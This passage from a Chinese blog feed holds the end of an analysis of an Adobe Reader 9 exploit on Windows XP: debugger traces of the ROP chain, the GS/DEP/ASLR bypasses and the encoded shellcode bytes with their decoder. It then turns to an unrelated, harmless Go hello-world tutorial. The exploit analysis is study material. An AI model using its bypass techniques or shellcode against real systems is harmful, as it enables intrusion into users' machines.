&lt;p&gt;可以看出执行&lt;code&gt;ROP&lt;/code&gt;使用了多条链，这里要指出的一点是此版本的Reader开启了&lt;code&gt;ASLR&lt;/code&gt;，但是却没有覆盖到这里所用的&lt;code&gt;icucnv36.dll&lt;/code&gt;这个模块，所以以上的ROP链是可以稳定执行的。到此漏洞利用的行为基本分析清楚，我们来回顾一下，作者是如何逐个突破这些安全机制的限制，一步一步达到&lt;code&gt;RCE&lt;/code&gt;的&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;&lt;li&gt;GS--&amp;gt;这里作者使用了覆盖C++的虚函数指针的方式来绕过的，使得在函数返回做检查之前就成功劫持程序执行流&lt;/li&gt;
&lt;li&gt;DEP--&amp;gt;这里使用的是经典的对抗方式&lt;code&gt;ROP&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ASLR--&amp;gt;作者找到了未开启ASLR的模块来依托其稳定的执行ROP链&lt;br/&gt;这其中尤其是绕过&lt;code&gt;GS&lt;/code&gt;所使用的覆盖C++虚表函数指针的操作，使得整个利用的过程获得了完美的转机，本环境中系统是默认开启了&lt;code&gt;safeSEH&lt;/code&gt;防护的，在这样的条件下使用覆盖C++虚表函数的方式，直接可以同时间绕过&lt;code&gt;GS&lt;/code&gt;和&lt;code&gt;safeSEH&lt;/code&gt;，两全其美。&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;h2 id=&quot;shellcode分析&quot;&gt;shellcode分析&lt;/h2&gt;
&lt;p&gt;shellcode部分首先就是执行了一个&lt;code&gt;CreateFileW&lt;/code&gt;函数来创建一个文件，下面是这个函数的定义&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c&quot;&gt;HANDLE CreateFile(

　　LPCTSTR lpFileName, //指向文件名的指针

　　DWORD dwDesiredAccess, //访问模式（写/读）

　　DWORD dwShareMode, //共享模式

　　LPSECURITY_ATTRIBUTES lpSecurityAttributes, //指向安全属性的指针

　　DWORD dwCreationDisposition, //如何创建

　　DWORD dwFlagsAndAttributes, //文件属性

　　HANDLE hTemplateFile //用于复制文件句柄

　　);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们来看一下此时的参数&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cpp&quot;&gt;0:000&amp;gt; p
eax=7ffdebf8 ebx=00000000 ecx=7ffdec00 edx=4a8522c8 esi=0224b760 edi=0013e718
eip=7c801a4e esp=0c0c0c04 ebp=0c0c0c20 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202
kernel32!CreateFileA+0x26:
7c801a4e e886f20000      call    kernel32!CreateFileW (7c810cd9)
0:000&amp;gt; dd esp
0c0c0c04  7ffdec00 10000000 00000000 00000000
0c0c0c14  00000002 00000102 00000000 41414141
0c0c0c24  4a801064 4a8522c8 10000000 00000000
0c0c0c34  00000000 00000002 00000102 00000000
0c0c0c44  4a8063a5 4a801064 4a842db2 4a802ab1
0c0c0c54  00000008 4a80a8a6 4a801f90 4a849038
0c0c0c64  4a80b692 4a801064 ffffffff 00000000
0c0c0c74  00000040 00000000 00010000 00000000
0:000&amp;gt; dc 7ffdec00 
7ffdec00  00730069 0038006f 00350038 00310039  i.s.o.8.8.5.9.1.
7ffdec10  00640000 00650052 00650063 00760069  ..d.R.e.c.e.i.v.
7ffdec20  00430065 006e006f 00630065 00690074  e.C.o.n.e.c.t.i.
7ffdec30  006e006f 0045002e 00650076 0074006e  o.n...E.v.e.n.t.
7ffdec40  0045002e 00470048 0049002e 00000043  ..E.H.G...I.C...
7ffdec50  0069005c 00750063 00740064 00360033  \.i.c.u.d.t.3.6.
7ffdec60  0063005f 006b006a 0064002e 006c006c  _.c.j.k...d.l.l.
7ffdec70  006c0000 006e0000 0061002e 006c0070  ..l...n...a.p.l.
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;根据函数的定义我们知道&lt;code&gt;0x7ffdec00&lt;/code&gt;这个地址处就是创建的文件文件名，我们看到其名字是&lt;code&gt;iso88591&lt;/code&gt;，这里还要指出的一点是创建的文件是和打开的pdf在一个文件夹下面，但是，他是隐藏文件(参考栈中的参数)，不过在创建文件以后，通过&lt;code&gt;Everything&lt;/code&gt;还是很容易搜索得到的&lt;/p&gt;
&lt;center&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1278763/202010/1278763-20201017225908010-1692025491.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/center&gt;
&lt;p&gt;创建文件以后又调用了&lt;code&gt;CreatFileMapping&lt;/code&gt;函数为刚刚创建的文件生成一个文件共享内存映像，其函数原型和参数如下所示&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c&quot;&gt;HANDLE CreateFileMapping(
  HANDLE hFile,                       //物理文件句柄
  LPSECURITY_ATTRIBUTES lpAttributes, //安全设置
  DWORD flProtect,                    //保护设置
  DWORD dwMaximumSizeHigh,            //高位文件大小
  DWORD dwMaximumSizeLow,             //低位文件大小
  LPCTSTR lpName                      //共享内存名称
);
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cpp&quot;&gt;0:000&amp;gt; p
eax=4a849038 ebx=00000008 ecx=4a801064 edx=00160608 esi=00000000 edi=0000048c
eip=7c80955a esp=0c0c0c40 ebp=0c0c0c64 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246
kernel32!CreateFileMappingA+0x50:
7c80955a e8ddfeffff      call    kernel32!CreateFileMappingW (7c80943c)
0:000&amp;gt; dd esp
0c0c0c40  0000048c 00000000 00000040 00000000
0c0c0c50  00010000 00000000 0224b760 4a801064
0c0c0c60  4a801064 41414141 4a801064 0000048c
0c0c0c70  00000000 00000040 00000000 00010000
0c0c0c80  00000000 4a8063a5 4a801064 4a842db2
0c0c0c90  4a802ab1 00000008 4a80a8a6 4a801f90
0c0c0ca0  4a849030 4a80b692 4a801064 ffffffff
0c0c0cb0  00000022 00000000 00000000 00010000
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在这之后紧接着，用相同的手段调用了&lt;code&gt;CreateFileMappingEx&lt;/code&gt;函数，将之前创建的文件内存映射对象映射到当前程序的地址空间，其函数原型和参数如下&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c&quot;&gt;LPVOID WINAPI MapViewOfFileEx(
　　__in HANDLE hFileMappingObject,
　　__in DWORD dwDesiredAccess,
　　__in DWORD dwFileOffsetHigh,
　　__in DWORD dwFileOffsetLow,
　　__in SIZE_T dwNumberOfBytesToMap,
　　__in LPVOID lpBaseAddress
　　);
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cpp&quot;&gt;0:000&amp;gt; p
eax=4a849030 ebx=00000008 ecx=4a801064 edx=7c90e514 esi=0224b760 edi=00000488
eip=7c80b9bb esp=0c0c0c8c ebp=0c0c0ca4 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246
kernel32!MapViewOfFile+0x16:
7c80b9bb e876ffffff      call    kernel32!MapViewOfFileEx (7c80b936)
0:000&amp;gt; dd esp
0c0c0c8c  00000488 00000022 00000000 00000000
0c0c0c9c  00010000 00000000 41414141 4a801064
0c0c0cac  00000488 00000022 00000000 00000000
0c0c0cbc  00010000 4a8063a5 4a8a0004 4a802196
0c0c0ccc  4a8063a5 4a801064 4a842db2 4a802ab1
0c0c0cdc  00000030 4a80a8a6 4a801f90 4a8a0004
0c0c0cec  4a80a7d8 4a8063a5 4a801064 4a842db2
0c0c0cfc  4a802ab1 00000020 4a80a8a6 4a8063a5
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;再往下走，我们碰到了一个很熟悉的函数&lt;code&gt;memcpy&lt;/code&gt;，此处将真正的&lt;code&gt;shellcode&lt;/code&gt;复制到映射过来的内存区域，然后执行&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-cpp&quot;&gt;0:000&amp;gt; p
eax=0c0c1d54 ebx=0000000a ecx=00000400 edx=00000000 esi=0c0c0d54 edi=03f30000
eip=7814507a esp=0c0c0d38 ebp=0c0c0d40 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200212
MSVCR80!memcpy+0x5a:
7814507a f3a5            rep movs dword ptr es:[edi],dword ptr [esi]
0:000&amp;gt; dd esi
0c0c0d54  1039dbb8 d9dada5b 5af42474 31b1c931
0c0c0d64  31fcea83 42030f42 a7e5dbd4 58069902
0c0c0d74  bd8ffed2 b6eb3ee3 9a7f8f53 0f2d645f
0c0c0d84  20fa08d4 0fdca65d 111d9b5e f171e6dc
0c0c0d94  f08428dd a065541a 55d812f3 dee16e70
0c0c0da4  02617eca 9540819a 1742db91 0fcb5076
0c0c0db4  a4855d9b 6d14296f 50bbd2be 95c5210f
0c0c0dc4  efb0dab7 2bc367c4 a846b3b7 14f0371f
0:000&amp;gt; u esi
0c0c0d54 b8db39105b      mov     eax,5B1039DBh
0c0c0d59 dada            fcmovu  st,st(2)
0c0c0d5b d97424f4        fnstenv [esp-0Ch]
0c0c0d5f 5a              pop     edx
0c0c0d60 31c9            xor     ecx,ecx
0c0c0d62 b131            mov     cl,31h
0c0c0d64 83eafc          sub     edx,0FFFFFFFCh
0c0c0d67 31420f          xor     dword ptr [edx+0Fh],eax
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这时我们发现已经创建号的文件中被写入了&lt;code&gt;shellcode&lt;/code&gt;，打开如下所示&lt;/p&gt;
&lt;center&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1278763/202010/1278763-20201017233902860-1883032720.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;/center&gt;
&lt;p&gt;可以发现这正是我们复制过来的数据，随后我们对其进行反汇编，看看其代码，如下所示&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-c&quot;&gt;void fcn.00000000(int64_t arg1, int64_t arg2, int64_t arg_10h)
{
    uint32_t uVar1;
    int64_t iVar2;
    uint64_t uVar3;
    int64_t unaff_RSI;
    int64_t unaff_RDI;
    uint32_t in_FPUInstructionPointer;
    
    uVar1 = 0x81876589;
    uVar3 = (uint64_t)in_FPUInstructionPointer;
    iVar2 = 0x59;
    do {
        uVar3 = (uint64_t)((int32_t)uVar3 + 4);
        *(uint32_t *)(uVar3 + 0x10) = *(uint32_t *)(uVar3 + 0x10) ^ uVar1;
        uVar1 = uVar1 + *(int32_t *)(uVar3 + 0x10);
        iVar2 = iVar2 + -1;
    } while (iVar2 != 0);
    fcn.000000b0(unaff_RSI, unaff_RDI);
    // WARNING: Bad instruction - Truncating control flow here
    halt_baddata();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;作者在选择执行&lt;code&gt;shellcode&lt;/code&gt;的时候选择用创建新的可执行内存区域的方式使得任意代码执行更稳定，这种稳妥的利用不失为一种好的思路。&lt;/p&gt;
</description>
<pubDate>Sat, 17 Oct 2020 15:47:00 +0000</pubDate>
<dc:creator>Taolaw</dc:creator>
<og:description>前言 此漏洞是根据泉哥的《漏洞战争》来学习分析的，网上已有大量分析文章在此只是做一个独立的分析记录。 复现环境 操作系统 → Windows XP Sp3 软件版本 → Adobe Reader 9.</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/Taolaw/p/13823479.html</dc:identifier>
</item>
<item>
<title>Go语言基础知识01-用Go打个招呼  - Neo Nengrong Qu</title>
<link>http://www.cnblogs.com/QuLory/p/13832596.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/QuLory/p/13832596.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;https://mmbiz.qpic.cn/mmbiz_png/UxuMrcWDKvKJVSm0aC6thP8lRUYpNR3GjTr52caWGtoVlmQicfCAB5ibS1bARztC2xib56iaXtl5oCwZnkHO50ibuzQ/640?wx_fmt=png&quot; class=&quot;rich_pages&quot; data-backh=&quot;717&quot; data-backw=&quot;578&quot; data-ratio=&quot;1.239463601532567&quot; data-s=&quot;300,640&quot; data-type=&quot;png&quot; data-w=&quot;1044&quot;/&gt;&lt;/p&gt;
&lt;p&gt;每一种编程语言，从读一本好书开始&lt;/p&gt;
&lt;p&gt;每一种编程语言，也从Helloworld开始&lt;/p&gt;
&lt;hr/&gt;
&lt;h2&gt;1.1 安装golang&lt;/h2&gt;
&lt;p&gt;在Ubuntu下，直接输入命令可以安装最新版本：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:bash;gutter:true;&quot;&gt;
$ sudo apt-get install golang
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;如果是其他Linux系统，请查找相应安装命令，或者windows下用安装包直接安装;&lt;/p&gt;

&lt;h2&gt;1.2 环境配置并检查env&lt;/h2&gt;
&lt;p&gt;已经2020了，建议直接使用go mod来管理代码， 配置方法如下， 在bash中执行：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;# 启动go module模式
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; go &lt;span&gt;env&lt;/span&gt; -&lt;span&gt;w&lt;/span&gt; GO111MODULE=&lt;span&gt;on
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt; &lt;span&gt;# 使用国内代理，防止无法下载一些外网墙掉的包
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt; go &lt;span&gt;env&lt;/span&gt; -&lt;span&gt;w&lt;/span&gt; GOPROXY=http:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;goproxy.cn,direct&lt;/span&gt;
&lt;span&gt;5&lt;/span&gt; &lt;span&gt;# 国内的码云可以直接访问不走代理
&lt;/span&gt;&lt;span&gt;6&lt;/span&gt; go &lt;span&gt;env&lt;/span&gt; -&lt;span&gt;w&lt;/span&gt; GOPRIVATE=gitee.com
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;配置完成后， 可以见检查一下相关参数是否正确， 下面的做参考：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
$ go &lt;span&gt;env&lt;/span&gt;&lt;span&gt;
GO111MODULE&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;on&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
GOARCH&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;amd64&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
GOBIN&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/home/neo/go-pro/bin&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
GOCACHE&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/home/neo/.cache/go-build&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
GOENV&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/home/neo/.config/go/env&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
GOEXE&lt;/span&gt;=&lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;span&gt;
GOFLAGS&lt;/span&gt;=&lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;span&gt;
GOHOSTARCH&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;amd64&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
GOHOSTOS&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;linux&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
GONOPROXY&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;gitee.com&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
GONOSUMDB&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;gitee.com&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
GOOS&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;linux&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
GOPATH&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/home/neo/go-pro&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
GOPRIVATE&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;gitee.com&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
GOPROXY&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;https://goproxy.cn,direct&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
GOROOT&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/usr/lib/go-1.13&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
GOSUMDB&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;sum.golang.org&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
GOTMPDIR&lt;/span&gt;=&lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;span&gt;
GOTOOLDIR&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/usr/lib/go-1.13/pkg/tool/linux_amd64&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
GCCGO&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;gccgo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
AR&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;ar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
CC&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;gcc&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
CXX&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;g++&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
CGO_ENABLED&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
GOMOD&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;/dev/null&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
CGO_CFLAGS&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;-g -O2&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
CGO_CPPFLAGS&lt;/span&gt;=&lt;span&gt;&quot;&quot;&lt;/span&gt;&lt;span&gt;
CGO_CXXFLAGS&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;-g -O2&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
CGO_FFLAGS&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;-g -O2&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
CGO_LDFLAGS&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;-g -O2&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
PKG_CONFIG&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;pkg-config&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
GOGCCFLAGS&lt;/span&gt;=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;-fPIC -m64 -pthread -fmessage-length=0 -fdebug-prefix-map=/tmp/go-build476496502=/tmp/go-build -gno-record-gcc-switches&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;hr/&gt;

&lt;h2&gt;2.1 建立接口文件 conversation.go&lt;/h2&gt;
&lt;p&gt;打开你最爱的编辑器， 输入打招呼函数 &lt;span&gt;Conversation&lt;/span&gt; 内容，如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;package main
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; 
&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;import (
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;     &quot;fmt&quot;
&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;)
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt; 
&lt;span&gt; 7&lt;/span&gt; // Conversation 触发一段对话， 询问你的名字并回答
&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;func Conversation() {
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;     fmt.Println(&quot;[下面是一段对话]&quot;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;     fmt.Println(&quot;Hello, I'm Go, what's your name?&quot;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;     name := &quot;&quot;
&lt;span&gt;12&lt;/span&gt; &lt;span&gt;    _, err := fmt.Scanln(&amp;amp;name)
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt; &lt;span&gt;    if err != nil {
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt;         fmt.Println(&quot;对不起, error found:&quot;&lt;span&gt;, err)
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; &lt;span&gt;        return
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt;     fmt.Println(&quot;很高兴认识你,&quot;&lt;span&gt;, name)
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;2.2 建立主函数文件 hello-world.go&lt;/h2&gt;
&lt;p&gt;继续使用你最心爱的编辑器， 写入主文件 hello-world.go ， &lt;span&gt;main&lt;/span&gt; 函数内容如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;package main
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; 
&lt;span&gt;3&lt;/span&gt; import &quot;fmt&quot;
&lt;span&gt;4&lt;/span&gt; 
&lt;span&gt;5&lt;/span&gt; &lt;span&gt;func main() {
&lt;/span&gt;&lt;span&gt;6&lt;/span&gt;     fmt.Println(&quot;Hello, 世界！&quot;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;7&lt;/span&gt; &lt;span&gt;    Conversation()
&lt;/span&gt;&lt;span&gt;8&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这里只是简单调用了一下前面的文件中的Conversation函数；&lt;/p&gt;

&lt;h2&gt;2.3 手撕代码要go fmt&lt;/h2&gt;
&lt;p&gt;在存放上面两个文件的路径下， 直接执行go fmt即可， 被格式化的文件会输出文件名， 比如下面的例子，故意让Conversation函数调用点没有对齐代码，被修复了;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://mmbiz.qpic.cn/mmbiz_png/UxuMrcWDKvKJVSm0aC6thP8lRUYpNR3GTpia0zZkvncxLaZiafMDI6zCAnibTsStMpB9B6nUKetlmLRZn9aDKo3BQ/0?wx_fmt=png&quot; class=&quot;rich_pages&quot; data-s=&quot;300,640&quot; data-type=&quot;png&quot; data-ratio=&quot;1.0433734939759036&quot; data-w=&quot;830&quot;/&gt;&lt;/p&gt;

&lt;h2&gt;2.4 直接go run 运行第一个程序吧&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://mmbiz.qpic.cn/mmbiz_png/UxuMrcWDKvKJVSm0aC6thP8lRUYpNR3GZKNbia1k71uXuduibnn4Tg30noNm5icwg0PvtvqpVoq9ib6YXaNEfSFDIA/0?wx_fmt=png&quot; class=&quot;rich_pages&quot; data-s=&quot;300,640&quot; data-type=&quot;png&quot; data-ratio=&quot;0.15871121718377088&quot; data-w=&quot;1676&quot;/&gt;&lt;/p&gt;

&lt;hr/&gt;

&lt;h2&gt;3.1 go get获取代码&lt;/h2&gt;
&lt;p&gt;本文的示例代码已经托管在码云平台， 大家可以直接取用; 在本地建立一个temp目录来进行实验。&lt;/p&gt;
&lt;p&gt;当前文章代码目录为： &lt;span&gt;&lt;strong&gt;gitee.com/NeoWorkShop/go-basics-study/ch01-say-hello &lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
neo@neo-hw-matebookxpro:~/go-pro/&lt;span&gt;temp
$ &lt;span&gt;go get &lt;/span&gt;&lt;/span&gt;&lt;span&gt;-v&lt;/span&gt; gitee.com/NeoWorkShop/go-basics-study/ch01-say-&lt;span&gt;hello
get &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;gitee.com/NeoWorkShop/go-basics-study&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: found meta tag get.metaImport{Prefix:&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;gitee.com/NeoWorkShop/go-basics-study&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, VCS:&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;git&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, RepoRoot:&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;https://gitee.com/NeoWorkShop/go-basics-study.git&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;} at &lt;span&gt;//&lt;/span&gt;&lt;span&gt;gitee.com/NeoWorkShop/go-basics-study?go-get=1&lt;/span&gt;
get &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;gitee.com/NeoWorkShop&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: found meta tag get.metaImport{Prefix:&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;gitee.com/NeoWorkShop&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, VCS:&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;git&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, RepoRoot:&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;https://gitee.com/NeoWorkShop&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;} at &lt;span&gt;//&lt;/span&gt;&lt;span&gt;gitee.com/NeoWorkShop?go-get=1&lt;/span&gt;
go: extracting gitee.com/NeoWorkShop/go-basics-study v1.&lt;span&gt;1.1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;获取到的文件，默认存放在 $GOPATH/pkg/mod 下， 结构如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
$ tree ../pkg/mod/gitee.com/\!neo\!work\!shop/go-basics-study@v1.&lt;span&gt;1.1&lt;/span&gt;/&lt;span&gt;
..&lt;/span&gt;/pkg/mod/gitee.com/!neo!work!shop/go-basics-study@v1.&lt;span&gt;1.1&lt;/span&gt;/&lt;span&gt;
├── ch01&lt;/span&gt;-say-&lt;span&gt;hello
│   ├── conversation.go
│   └── hello&lt;/span&gt;-&lt;span&gt;world.go
├── go.mod
├── LICENSE
└── README.md&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;两个文件正是步骤2中的代码;&lt;/p&gt;

&lt;h2&gt;3.2 go build构建小程序&lt;/h2&gt;
&lt;p&gt;直接使用标准的go build命令，可以在当前目录下生成可执行程序 ch01-say-hello ;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
go build gitee.com/NeoWorkShop/go-basics-study/ch01-say-hello
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;运行结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://mmbiz.qpic.cn/mmbiz_png/UxuMrcWDKvKJVSm0aC6thP8lRUYpNR3GlfxlrBRTjgQYQKVgL3QC6d0gdeJutQUqMGuZbibpBVgv1ePeVIAicNFQ/0?wx_fmt=png&quot; class=&quot;rich_pages&quot; data-s=&quot;300,640&quot; data-type=&quot;png&quot; data-ratio=&quot;0.4431818181818182&quot; data-w=&quot;1232&quot;/&gt;&lt;/p&gt;
&lt;p&gt;​&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;福利：&lt;/p&gt;
